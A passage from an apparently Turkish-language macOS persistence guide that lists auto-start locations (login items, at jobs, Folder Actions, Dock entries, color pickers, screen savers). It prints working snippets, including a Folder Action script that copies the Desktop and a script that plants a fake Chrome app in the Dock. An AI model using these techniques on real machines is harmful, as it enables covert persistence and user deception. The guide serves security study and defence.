Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak `osascript` komutunu argümanlarla çalıştırmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **Kayıtlı login-item yardımcı uygulaması:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (yaygın paketlenmiş konum).
  - **Tetikleyici:** Kayıt işlemi yardımcı uygulamayı hemen başlatabilir; daha sonra kullanıcı girişlerinde, onaya bağlı olarak yeniden başlatılır.
- **Kayıtlı paketlenmiş agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` veya `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Tetikleyici:** Onaylanmış bir agent kayıt sırasında ve sonraki girişlerde başlayabilir; onaylanmış bir daemon ise açılışta başlar. Bir daemon için admin onayı gerekir.

#### Açıklama

Kullanıcılar **Sistem Ayarları → Genel → Login Items & Extensions** bölümünde giriş ve arka plan öğelerini inceleyebilir. macOS 13 ve sonraki sürümlerde paketlenmiş login item'ları, launch agent'ları ve launch daemon'ları kaydetmek için [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) bulunur. [`register()` davranışı](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) türe ve onay durumuna göre değişir. **Bir yardımcı uygulamayı app bundle içine yazmak, yeni bir login item kaydetmek için yeterli değildir.** Buna karşılık, önceden kaydedilmiş bir yardımcı uygulamanın çalıştırılabilir dosyası yazılabiliyorsa, bu dosyanın değiştirilmesi yeni bir kayıt olmadan sonraki başlatmayı etkileyebilir; önce gerçek yolu ve code-signing kontrollerini doğrulayın.

Aşağıdaki yöntem, Mac'te paketlenmiş yardımcı uygulamaları aramanın salt okunur bir yoludur; bunlardan hiçbirini kaydetmez veya başlatmaz:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Birlikte paketlenmiş bir launch plist için `BundleProgram` değerini [Apple'ın Service Management geçiş yönergelerinde](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) belirtildiği gibi **app bundle köküne göre** çözümleyin (örneğin `Contents/MacOS/Helper`). Araştırma Mac'inde `/Applications` dizininde salt okunur envanter çıkarıldığında 14 birlikte paketlenmiş helper girdisi ve beş `BundleProgram` bildirimi bulundu; beş hedefin tamamı çözümlendi ve ikisi kullanıcı tarafından yazılabilirlik denetimini geçti. Bu denetim, helper'lardan herhangi birinin kayıtlı, etkin, imza doğrulamasından sonra çalıştırılabilir veya sandbox tarafından erişilebilir olduğunu **kanıtlamaz**. `sfltool dumpbtm`, bu Mac'te adlandırılmış 150 kayıt listeledi; bu bir inceleme aracıdır, her kaydın çalıştığını test etmez.

Eski giriş öğeleri Apple events aracılığıyla da yönetilebilir. Bunları komut satırından listelemek, eklemek ve kaldırmak mümkündür; ancak ekleme, kullanıcının kalıcı giriş yapılandırmasını değiştirir ve Automation onayı gerektirebilir:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`, bir uygulama ayrıntısıdır; yalnızca dosya yazarak payload yüklemek için desteklenen bir konum değildir. Eski `SMLoginItemSetEnabled` API'si, yeni yardımcı uygulamalar için `SMAppService` ile değiştirilmiştir; sayfada daha önce belirtilen `/var/db/com.apple.xpc.launchd/loginitems.501.plist` yolu, macOS 26.5.2 test makinesinde mevcut değildi. Modern login item'ları değerlendirirken varsayılan bir veritabanı yoluna güvenmek yerine kayıt API'sini ve sistem arayüzünün durumunu kullanın.

### ZIP as Login Item

(Login Items hakkındaki önceki bölüme bakın; bu bir uzantıdır)

Bir **ZIP** dosyasını **Login Item** olarak kaydederseniz **`Archive Utility`** dosyayı açar. Örneğin zip, **`~/Library`** içinde saklanmışsa ve içinde arka kapı içeren **`LaunchAgents/file.plist`** klasörü varsa, bu klasör oluşturulur (varsayılan olarak mevcut değildir) ve plist eklenir. Böylece kullanıcı bir sonraki oturum açışında **plist'te belirtilen arka kapı çalıştırılır**.

Başka bir seçenek, `LaunchAgents` klasörü zaten mevcutsa bu tekniğin yine de işe yaraması için kullanıcı HOME dizininde **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır.

### At

Yazım: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak **`at`** komutunu **çalıştırmanız** ve etkinleştirilmiş olması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`at`** komutunu **çalıştırmanız** ve etkinleştirilmiş olması gerekir

#### **Açıklama**

`at` görevleri, belirli zamanlarda çalıştırılmak üzere **tek seferlik görevleri zamanlamak** için tasarlanmıştır. Cron job'larının aksine, `at` görevleri çalıştırıldıktan sonra otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmalarında da kalıcı olduğunu, dolayısıyla belirli koşullar altında olası bir güvenlik riski oluşturduğunu unutmamak önemlidir.<sup>[[16]](#references)</sup>

Birlikte gelen `com.apple.atrun.plist` dosyasında `Disabled = true` olsa da, launchd etkin/devre dışı geçersiz kılma ayarlarını ayrı olarak tutar. macOS 26.5.2 test makinesinde `launchctl print-disabled system`, bu anahtara rağmen `com.apple.atrun` öğesini **etkin** olarak bildirdi. `at` görevlerinin çalışacağını öne sürmeden önce etkin durumu kontrol edin:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Bir yönetici, `launchctl` ile devre dışı bırakılmış `atrun` hizmetini etkinleştirebilir; aşağıdaki tarihî örnek sistem hizmetinin durumunu değiştirir ve araştırma Mac’inde **çalıştırılmamıştır**:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Bu, 1 saat içinde bir dosya oluşturacak:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

İş kuyruğunu `atq` kullanarak kontrol edin:

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Yukarıda zamanlanmış iki iş görebiliriz. `at -c JOBNUMBER` kullanarak işin ayrıntılarını yazdırabiliriz.

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> AT tasks etkin değilse oluşturulan görevler çalıştırılmaz.

**job files** şu konumda bulunabilir: `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Dosya adı kuyruğu, iş numarasını ve çalışmasının planlandığı zamanı içerir. Örneğin `a0001a019bdcd2` değerine bakalım.

- `a` - kuyruk
- `0001a` - hex cinsinden iş numarası, `0x1a = 26`
- `019bdcd2` - hex cinsinden zaman. Epoch'tan bu yana geçen dakikaları gösterir. `0x019bdcd2`, ondalık olarak `26991826` değeridir. Bunu 60 ile çarparsak `1619509560` elde ederiz; bu da `GMT: 2021. 27 Nisan, Salı 7:46:00` tarihine karşılık gelir.

İş dosyasını yazdırırsak, `at -c` kullanarak elde ettiğimiz bilgilerin aynısını içerdiğini görürüz.

### Calendar dosya açma uyarıları

- **Yazma hedefi:** Calendar etkinliğinin özel **Open file** uyarısı tarafından **önceden seçilmiş** yürütülebilir bir uygulama paketi veya başka bir dosya. Uyarının kendisini oluşturmak ya da düzenlemek için Calendar veya kabul edilmiş bir takvim veri kaynağı üzerinden ilgili takvim etkinliğine erişmek gerekir; rastgele bir dosyaya yazmak uyarı oluşturmaz.
- **Tetikleyici:** Calendar'ın etkinliği işlediği Mac'te uyarının planlanan zamanı. Yinelenen bir etkinlik bu işlemi tekrar edebilir. [Apple'ın güncel Calendar kılavuzu](https://support.apple.com/guide/calendar/icl1012/mac), macOS 26'da **Custom → Open file** uyarı seçeneğinin bulunduğunu doğrular.
- **Çalıştırma kimliği ve koşullar:** Calendar, seçilen dosyayı ilişkili uygulaması üzerinden oturum açmış kullanıcı için açar. Bir uygulama paketinin başlatılması, Gatekeeper, quarantine ve diğer macOS denetimlerine bağlı olarak kodunu bu kullanıcı olarak çalıştırabilir. Düz bir betik dosyası yalnızca bir düzenleyicide açılabilir; dosya uzantısı tek başına kodun çalıştırıldığını kanıtlamaz.

Bir adayın güvenliğini değerlendirmek için etkinliğin uyarısını Calendar'da ve seçilen dosyanın izinlerini inceleyin. Bu yöntem Apple'ın kılavuzunda belgelenmiştir ve canlı bir takvimi değiştirmeyi ve masaüstü etkinliğini beklemeyi gerektireceğinden araştırma Mac'inde **çalıştırılmamıştır**. Atıl bir hesapta, yalnızca işaretleyici içeren bir uygulama paketi seçilebilir, yakın bir zaman için Open file uyarısı ayarlanabilir, başlatma doğrulanabilir ve ardından etkinlik ile uygulama silinebilir.

### macOS'ta Shortcuts otomasyonları

- **Yazma hedefi:** Kısayolun bir eylemi tarafından **önceden referans verilmiş** yürütülebilir bir dosya veya yetkili bir kullanıcının düzenleyebileceği mevcut bir kısayol. Rastgele bir `.shortcut` dosyası veya belgelenmemiş bir Shortcuts veritabanına yazmak, desteklenen bir otomasyon kaydetme yöntemi değildir.
- **Tetikleyici ve kimlik:** Günün saati veya uygulama etkinliği gibi önceden yapılandırılmış, etkin bir otomasyon olayı, kısayolu oturum açmış kullanıcı için çalıştırır. [Apple'ın güncel Mac otomasyon kılavuzu](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) desteklenen olayları listeler, otomasyonun ne zaman sormadan çalışabileceğini açıklar ve bir tetikleyicinin kaldırılmasını anlatır. [Apple'ın Shortcuts gizlilik kılavuzu](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac), betik eylemleri için **Allow Running Scripts** iznini gerektirir; ayrıca tek tek eylemler yine de izin isteyebilir.

Bu, **yalnızca mevcut eylem yazılabilir bir hedefi yüklediğinde** geçerli olan koşullu bir yazmadan çalıştırmaya yoludur. Arayüz üzerinden yeni bir otomasyon oluşturmak canlı ayarları değiştireceğinden araştırma Mac'inde denenmemiştir. Atıl bir hesapta, sahibi betiği `/tmp/ht-shortcuts-marker` dosyasına dokunan bir günün saati kısayolu yapılandırabilir, gerekli izinleri etkinleştirebilir, olaydan sonra işaretleyiciyi doğrulayabilir ve ardından otomasyonu, kısayolu ve işaretleyiciyi silebilir.

### Automator eylemleri ve Quick Actions

- **Yazma hedefleri:** Eylem paketleri için kullanıcı dizininde `~/Library/Automator/*.action`, yönetici dizininde `/Library/Automator/*.action`. Kaydedilmiş bir Quick Action iş akışı genellikle `~/Library/Services/*.workflow` konumunda tutulur; kullanıcının seçtiği gerçek iş akışı yolunu kontrol edin. [Apple'ın Automator framework başvurusu](https://developer.apple.com/documentation/automator), eylem arama dizinlerini listeler.
- **Tetikleyici:** Automator çalıştığında mevcut eylem paketlerini yükler, ancak bir eylemin görevi, onu kullanan iş akışı yürütüldüğünde çalışır. Quick Action, kullanıcı onu Finder'dan, Services'tan veya başka bir menüden seçtiğinde çalışır. Folder Action iş akışı, öğeler **önceden ilişkilendirilmiş** klasörüne eklendiğinde çalışır; Calendar Alarm iş akışı ise etkinlik zamanında çalışır. [Apple'ın iş akışı türleri](https://support.apple.com/guide/automator/aut7cac58839/mac) bu olayları birbirinden ayırır. Yalnızca bir eylem veya iş akışı yazmak, bir klasörü ilişkilendirmez ya da takvim etkinliği planlamaz.
- **Çalıştırma kimliği ve koşullar:** İş akışını çalıştıran hesap; Automator veya çağıran uygulama eylemi yüklemeli ve mevcut kod imzalama ya da gizlilik denetimleri buna izin vermelidir. Etkin bir iş akışının zaten referans verdiği yazılabilir bir eylem paketi, yeni bir eylem yükleyip seçilmesini beklemekten farklıdır.

macOS 26.5.2 test Mac'inde kullanıcıya ait `Automator` ve `Services` dizinleri mevcuttu; `/Library/Automator` yoktu. Canlı bir iş akışı oluşturulmadı, ilişkilendirilmedi veya çalıştırılmadı. Belirli bir yükleme yolunu doğrulamak için atıl bir hesap ve yalnızca işaretleyici kullanan bir eylem/iş akışı kullanın. Ayrı [Folder Actions](#folder-actions) bölümü bu olay kaynağını daha ayrıntılı ele alır.

### Folder Actions

Yazı: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Yazı: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
  - Ancak Folder Actions'ı yapılandırabilmek için **`System Events`** ile iletişim kurmak üzere argümanlarla `osascript` çağırabilmeniz gerekir.
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Desktop, Documents ve Downloads gibi bazı temel TCC izinlerine sahiptir.

#### Konum

- **`/Library/Scripts/Folder Action Scripts`**
  - Root gerekir
  - **Tetikleyici**: Belirtilen klasöre erişim
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Tetikleyici**: Belirtilen klasöre erişim

#### Açıklama ve Exploitation

Folder Actions; öğe ekleme, kaldırma veya klasör penceresini açma ya da yeniden boyutlandırma gibi klasördeki değişikliklerle otomatik olarak tetiklenen betiklerdir. Bu eylemler çeşitli görevler için kullanılabilir ve Finder arayüzü veya terminal komutları gibi farklı yöntemlerle tetiklenebilir.<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions'ı ayarlamak için şu seçenekleriniz vardır:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Folder Action iş akışı oluşturup hizmet olarak yüklemek.
2. Bir klasörün bağlam menüsündeki Folder Actions Setup üzerinden betiği elle ilişkilendirmek.
3. Bir Folder Action'ı programlı olarak ayarlamak için `System Events.app` uygulamasına Apple Event mesajları gönderen OSAScript kullanmak.
   - Bu yöntem, eylemi sisteme yerleştirerek bir kalıcılık düzeyi sağladığı için özellikle kullanışlıdır.

Aşağıdaki betik, bir Folder Action tarafından çalıştırılabilecek bir örnektir:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Yukarıdaki betiği Folder Actions tarafından kullanılabilir hâle getirmek için şu komutla derleyin:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Komut dosyası derlendikten sonra, aşağıdaki komut dosyasını çalıştırarak Folder Actions'ı ayarlayın. Bu komut dosyası, Folder Actions'ı genel olarak etkinleştirir ve önceden derlenen komut dosyasını Desktop klasörüne bağlar.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Kurulum betiğini şu komutla çalıştırın:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- GUI aracılığıyla bu persistence'ı uygulamanın yolu budur:

Bu, yürütülecek script'tir:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Şununla derleyin: `osacompile -l JavaScript -o folder.scpt source.js`

Şuraya taşıyın:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Ardından `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve kendi durumunuzda **`folder.scpt`** dosyasını seçin (benim durumumda dosyaya output2.scp adını verdim):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Şimdi bu klasörü **Finder** ile açarsanız script'iniz çalıştırılır.

Bu yapılandırma, base64 formatında bulunan **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** plist dosyasına kaydedildi.

Şimdi bu persistence'ı GUI erişimi olmadan hazırlamayı deneyelim:

1. Yedeklemek için **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dosyasını `/tmp` konumuna **kopyalayın**:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Az önce oluşturduğunuz Folder Actions'ı **kaldırın**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Artık boş bir ortamımız olduğuna göre

3. Yedek dosyayı kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu yapılandırmayı kullanmak için Folder Actions Setup.app'i açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bu bende işe yaramadı, ancak writeup'taki talimatlar bunlar:(

### Dock kısayolları

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak sistemin içine kötü amaçlı bir uygulama yüklemiş olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `~/Library/Preferences/com.apple.dock.plist`
  - **Tetikleyici**: Kullanıcı Dock'taki uygulamaya tıkladığında

#### Açıklama ve Exploitation

Dock'ta görünen tüm uygulamalar şu plist içinde belirtilir: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Şunu kullanarak **bir uygulama eklemek** mümkündür:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Using some **social engineering** you could **impersonate for example Google Chrome** inside the Dock and actually execute your own script:

**Social engineering** kullanarak Dock'ta örneğin **Google Chrome'u taklit edebilir** ve kendi betiğinizi gerçekten çalıştırabilirsiniz:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Giriş Yöntemleri

- **Yazma hedefi:** `~/Library/Input Methods/` (kullanıcı) veya `/Library/Input Methods/` (yönetici) konumuna yüklenmiş, kod içeren bir input-method uygulama paketi. Bu, tek başına keyfi kod yükü olmayan Apple'ın düz metin `.inputplugin` klavye eşleme dosyalarından farklıdır.
- **Tetikleyici:** Kullanıcı, input source'u **Sistem Ayarları → Klavye → Metin Girişi** bölümünde ekler/etkinleştirir ve ardından seçer veya kullanır. Bir paketin yalnızca dizine kopyalanması, macOS'un onu başlatacağının kanıtı değildir. [Apple'ın güncel Input Sources kılavuzu](https://support.apple.com/guide/mac-help/mchl84525d76/mac), kaynakları etkinleştirme ve değiştirme işlemlerini açıklar; [Apple'ın InputMethodKit belgeleri](https://developer.apple.com/documentation/inputmethodkit) ise kod içeren input method'ları ele alır.
- **Çalıştırma kimliği ve kontroller:** Yöntem, oturum açmış kullanıcı adına çalışır ve input-method kaydı, code-signing ve güncel macOS güvenlik kontrollerine tabidir. Yazılabilir bir executable'a sahip, önceden etkinleştirilmiş yöntemler için ayrıca yol ve imza incelemesi gerekir.

Apple'ın [üçüncü taraf input method'ları hakkındaki eski notu](https://developer.apple.com/library/archive/qa/qa1810/_index.html), belirli palette method'larını bu dizinlere kopyalamanın, bunların Input Sources'ta görünmesini bile sağlamadığını zaten belirtmişti. macOS 26.5.2 araştırma Mac'inde kullanıcı dizini mevcut, ancak hiçbir paket yüklenmemiş veya etkinleştirilmemişti; bu nedenle bu, yerel bir çalışma zamanı sonucu değil, belgelenmiş koşullu bir yoldur.

### Renk Seçiciler

Yazı: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Çok özel bir eylemin gerçekleşmesi gerekir
  - Başka bir sandbox içinde olursunuz
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/Library/ColorPickers`
  - Root gerekir
  - Tetikleyici: Renk seçiciyi kullanma
- `~/Library/ColorPickers`
  - Tetikleyici: Renk seçiciyi kullanma

#### Açıklama ve Exploit

Kodunuzla bir **renk seçici** paketi derleyin (örneğin [**şunu**](https://github.com/viktorstrate/color-picker-plus) kullanabilirsiniz), bir constructor ekleyin ([Ekran Koruyucu bölümündeki](macos-auto-start-locations.md#screen-saver) gibi) ve paketi `~/Library/ColorPickers` konumuna kopyalayın.<sup>[[20]](#references)</sup>

Ardından, renk seçici tetiklendiğinde paketiniz de çalışmalıdır.

Bu, uyumlu bir uygulamanın sistem renk panelini açmasına ve yüklenmiş seçiciyi seçmesine bağlıdır. [Apple'ın renk paneli kılavuzu](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html), eski paket konumlarını açıklar. Yerel bir yol kontrolünde eski renk seçici XPC hizmeti bulundu, ancak araştırma Mac'inde hiçbir seçici yüklenmemiş veya çalıştırılmamıştı; yalnızca yola bakarak bir TCC bypass olduğu sonucuna varmayın.

Kitaplığınızı yükleyen binary'nin **çok kısıtlayıcı bir sandbox'ı** olduğunu unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: **Hayır, çünkü kendi uygulamanızı çalıştırmanız gerekir**
- TCC bypass: Etkin extension'ın sandbox'ına ve izinlerine bağlıdır; genel bir bypass belirlenmemiştir.

#### Konum

- Belirli bir uygulama

#### Açıklama ve Exploit

Finder Sync Extension içeren bir uygulama örneği [**burada bulunabilir**](https://github.com/D00MFist/InSync).

Uygulamalar `Finder Sync Extensions` içerebilir. Bu extension, çalıştırılacak bir uygulamanın içine yerleştirilir. Ayrıca extension'ın kodunu çalıştırabilmesi için **geçerli bir Apple geliştirici sertifikasıyla imzalanmış** ve **sandbox'lanmış** olması (ancak daha esnek istisnalar eklenebilir) ve aşağıdakine benzer bir komutla kaydedilmesi gerekir:<sup>[[21]](#references)[[22]](#references)</sup>

Yüklenmiş bir extension'ın **etkinleştirilmesi** ve ilgili bir Finder konumu veya öğesi için çağrılması da gerekir; rastgele bir `.appex` bundle yazmak yeterli değildir. [Apple'ın Finder Sync API'si](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) etkin durumu gösterir. Aşağıdaki `pluginkit` komutları açık kayıt ve etkinleştirme işlemlerini gösterir; yalnızca bir dosyanın bulunmasına dayalı otomatik başlatmayı değil. Bu yöntem belgeler incelenerek değerlendirildi; araştırma Mac'ine yeni bir extension yüklenmedi veya etkinleştirilmedi.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Ekran Koruyucu

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Sandbox'u atlatmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak standart bir uygulama sandbox'ında kalırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/System/Library/Screen Savers`
  - Root gerekir
  - **Tetikleyici**: Ekran koruyucuyu seçin
- `/Library/Screen Savers`
  - Root gerekir
  - **Tetikleyici**: Ekran koruyucuyu seçin
- `~/Library/Screen Savers`
  - **Tetikleyici**: Ekran koruyucuyu seçin

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama ve Exploit

Xcode'da yeni bir proje oluşturun ve yeni bir **Screen Saver** oluşturmak için şablonu seçin. Ardından kodunuzu ekleyin; örneğin, günlükler oluşturmak için aşağıdaki kodu kullanabilirsiniz.<sup>[[23]](#references)[[24]](#references)</sup>

**Derleyin** ve `.saver` paketini **`~/Library/Screen Savers`** konumuna kopyalayın. Ardından Screen Saver GUI'yi açın ve üzerine tıklamanız yeterli; çok sayıda günlük oluşturması gerekir:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Bu kodu yükleyen ikilinin (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) entitlements'ında **`com.apple.security.app-sandbox`** bulunduğuna dikkat edin; bu nedenle **ortak uygulama sandbox'ının içinde** olacaksınız.

Ekran koruyucu kodu:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
